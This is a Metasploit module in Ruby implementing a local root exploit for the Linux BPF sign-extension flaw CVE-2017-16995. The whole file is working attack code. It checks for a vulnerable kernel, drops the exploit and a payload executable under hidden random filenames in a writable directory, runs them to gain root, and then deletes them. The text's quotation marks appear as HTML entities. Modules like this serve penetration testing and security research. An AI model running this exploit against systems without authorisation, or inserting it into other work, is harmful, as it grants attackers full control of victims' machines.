# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GreatRanking

  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Linux BPF Sign Extension Local Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        Linux kernel prior to 4.14.8 utilizes the Berkeley Packet Filter (BPF)
        which contains a vulnerability where it may improperly perform sign
        extension. This can be utilized to escalate privileges.

        The target system must be compiled with BPF support and must not have
        kernel.unprivileged_bpf_disabled set to 1.

        This module has been tested successfully on:

        Debian 9.0 kernel 4.9.0-3-amd64;
        Deepin 15.5 kernel 4.9.0-deepin13-amd64;
        ElementaryOS 0.4.1 kernel 4.8.0-52-generic;
        Fedora 25 kernel 4.8.6-300.fc25.x86_64;
        Fedora 26 kernel 4.11.8-300.fc26.x86_64;
        Fedora 27 kernel 4.13.9-300.fc27.x86_64;
        Gentoo 2.2 kernel 4.5.2-aufs-r;
        Linux Mint 17.3 kernel 4.4.0-89-generic;
        Linux Mint 18.0 kernel 4.8.0-58-generic;
        Linux Mint 18.3 kernel 4.13.0-16-generic;
        Mageia 6 kernel 4.9.35-desktop-1.mga6;
        Manjero 16.10 kernel 4.4.28-2-MANJARO;
        Solus 3 kernel 4.12.7-11.current;
        Ubuntu 14.04.1 kernel 4.4.0-89-generic;
        Ubuntu 16.04.2 kernel 4.8.0-45-generic;
        Ubuntu 16.04.3 kernel 4.10.0-28-generic;
        Ubuntu 17.04 kernel 4.10.0-19-generic;
        ZorinOS 12.1 kernel 4.8.0-39-generic.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Jann Horn&#039;, # Discovery
          &#039;bleidl&#039;,    # Discovery and get-rekt-linux-hardened.c exploit
          &#039;vnik&#039;,      # upstream44.c exploit
          &#039;rlarabee&#039;,  # cve-2017-16995.c exploit
          &#039;h00die&#039;,    # Metasploit
          &#039;bcoles&#039;     # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;Nov 12 2017&#039;,
      &#039;Platform&#039;       => [ &#039;linux&#039; ],
      &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
      &#039;Targets&#039;        => [[ &#039;Auto&#039;, {} ]],
      &#039;Privileged&#039;     => true,
      &#039;References&#039;     =>
        [
          [ &#039;AKA&#039;, &#039;get-rekt-linux-hardened.c&#039; ],
          [ &#039;AKA&#039;, &#039;upstream44.c&#039; ],
          [ &#039;BID&#039;, &#039;102288&#039; ],
          [ &#039;CVE&#039;, &#039;2017-16995&#039; ],
          [ &#039;EDB&#039;, &#039;44298&#039; ],
          [ &#039;EDB&#039;, &#039;45010&#039; ],
          [ &#039;URL&#039;, &#039;https://github.com/rlarabee/exploits/blob/master/cve-2017-16995/cve-2017-16995.c&#039; ],
          [ &#039;URL&#039;, &#039;https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c&#039; ],
          [ &#039;URL&#039;, &#039;http://cyseclabs.com/pub/upstream44.c&#039; ],
          [ &#039;URL&#039;, &#039;https://blog.aquasec.com/ebpf-vulnerability-cve-2017-16995-when-the-doorman-becomes-the-backdoor&#039; ],
          [ &#039;URL&#039;, &#039;https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html&#039; ],
          [ &#039;URL&#039;, &#039;https://www.debian.org/security/2017/dsa-4073&#039; ],
          [ &#039;URL&#039;, &#039;https://usn.ubuntu.com/3523-2/&#039; ],
          [ &#039;URL&#039;, &#039;https://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-16995.html&#039; ],
          [ &#039;URL&#039;, &#039;https://bugs.chromium.org/p/project-zero/issues/detail?id=1454&#039; ],
          [ &#039;URL&#039;, &#039;http://openwall.com/lists/oss-security/2017/12/21/2&#039;],
          [ &#039;URL&#039;, &#039;https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=95a762e2c8c942780948091f8f2a4f32fce1ac6f&#039; ]
        ],
      &#039;DefaultTarget&#039;  => 0))
    register_options [
      OptEnum.new(&#039;COMPILE&#039;, [ true, &#039;Compile on target&#039;, &#039;Auto&#039;, %w[Auto True False] ]),
      OptString.new(&#039;WritableDir&#039;, [ true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039; ])
    ]
  end

  def base_dir
    datastore[&#039;WritableDir&#039;].to_s
  end

  def upload(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
  end

  def upload_and_chmodx(path, data)
    upload path, data
    cmd_exec "chmod +x &#039;#{path}&#039;"
  end

  def upload_and_compile(path, data)
    upload "#{path}.c", data

    gcc_cmd = "gcc -o #{path} #{path}.c"
    if session.type.eql? &#039;shell&#039;
      gcc_cmd = "PATH=$PATH:/usr/bin/ #{gcc_cmd}"
    end
    output = cmd_exec gcc_cmd
    rm_f "#{path}.c"

    unless output.blank?
      print_error output
    end

    cmd_exec "chmod +x #{path}"
  end

  def exploit_data(file)
    path = ::File.join Msf::Config.data_directory, &#039;exploits&#039;, &#039;cve-2017-16995&#039;, file
    fd = ::File.open path, &#039;rb&#039;
    data = fd.read fd.stat.size
    fd.close
    data
  end

  def live_compile?
    return false unless datastore[&#039;COMPILE&#039;].eql?(&#039;Auto&#039;) || datastore[&#039;COMPILE&#039;].eql?(&#039;True&#039;)

    if has_gcc?
      vprint_good &#039;gcc is installed&#039;
      return true
    end

    unless datastore[&#039;COMPILE&#039;].eql? &#039;Auto&#039;
      fail_with Failure::BadConfig, &#039;gcc is not installed. Compiling will fail.&#039;
    end
  end

  def check
    arch = kernel_hardware
    unless arch.include? &#039;x86_64&#039;
      vprint_error "System architecture #{arch} is not supported"
      return CheckCode::Safe
    end
    vprint_good "System architecture #{arch} is supported"

    if unprivileged_bpf_disabled?
      vprint_error &#039;Unprivileged BPF loading is not permitted&#039;
      return CheckCode::Safe
    end
    vprint_good &#039;Unprivileged BPF loading is permitted&#039;

    release = kernel_release
    if Gem::Version.new(release.split(&#039;-&#039;).first) > Gem::Version.new(&#039;4.14.11&#039;) ||
       Gem::Version.new(release.split(&#039;-&#039;).first) < Gem::Version.new(&#039;4.0&#039;)
      vprint_error "Kernel version #{release} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "Kernel version #{release} appears to be vulnerable"

    CheckCode::Appears
  end

  def exploit
    unless check == CheckCode::Appears
      fail_with Failure::NotVulnerable, &#039;Target not vulnerable! punt!&#039;
    end

    if is_root?
      fail_with Failure::BadConfig, &#039;Session already has root privileges&#039;
    end

    unless cmd_exec("test -w &#039;#{base_dir}&#039; && echo true").include? &#039;true&#039;
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    # Upload exploit executable
    executable_name = ".#{rand_text_alphanumeric rand(5..10)}"
    executable_path = "#{base_dir}/#{executable_name}"
    if live_compile?
      vprint_status &#039;Live compiling exploit on system...&#039;
      upload_and_compile executable_path, exploit_data(&#039;exploit.c&#039;)
    else
      upload_and_chmodx executable_path, exploit_data(&#039;exploit.out&#039;)
    end

    # Upload payload executable
    payload_path = "#{base_dir}/.#{rand_text_alphanumeric rand(5..10)}"
    upload_and_chmodx payload_path, generate_payload_exe

    # Launch exploit
    print_status &#039;Launching exploit ...&#039;
    output = cmd_exec "echo &#039;#{payload_path} & exit&#039; | #{executable_path} "
    output.each_line { |line| vprint_status line.chomp }
    print_status "Cleaning up #{payload_path} and #{executable_path} ..."
    rm_f executable_path
    rm_f payload_path
  end
end

